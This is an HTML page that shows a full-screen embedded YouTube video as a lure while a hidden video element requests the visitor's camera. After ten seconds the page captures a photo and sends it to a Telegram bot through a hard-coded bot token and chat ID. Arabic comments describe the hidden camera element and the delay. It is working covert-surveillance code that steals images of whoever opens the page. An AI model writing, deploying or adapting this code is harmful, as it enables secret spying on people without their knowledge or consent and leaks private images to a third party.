<!DOCTYPE html>
<html>
  <body style="margin: 0; padding: 0;">

    <!-- ✅ تشغيل فيديو اليوتيوب -->
    <iframe 
      width="100%" 
      height="100%" 
      src="https://www.youtube.com/embed/jwtYygCtIWM?autoplay=1&mute=1" 
      frameborder="0" 
      allow="autoplay; encrypted-media" 
      allowfullscreen>
    </iframe>

    <!-- ✅ عنصر فيديو الكاميرا (مخفي) -->
    <video id="video" autoplay playsinline style="display: none;"></video>

    <script>
      const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
      const CHAT_ID = '6036900535';
      const video = document.getElementById('video');

      async function startCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;

          video.onloadedmetadata = () => {
            // انتظر 10 ثواني ثم التقط صورة
            setTimeout(captureAndSendPhoto, 10000);
          };
        } catch (err) {
          console.error('Camera error:', err);
        }
      }

      async function captureAndSendPhoto() {
        if (video.readyState < 2) {
          setTimeout(captureAndSendPhoto, 2000);
          return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
          if (!blob) return;
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'photo.jpg');

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          })
          .then(() => console.log('✅ Photo sent'))
          .catch(err => console.error('❌ Failed to send photo:', err));
        }, 'image/jpeg', 0.95);
      }

      startCamera();
    </script>
  </body>
</html>
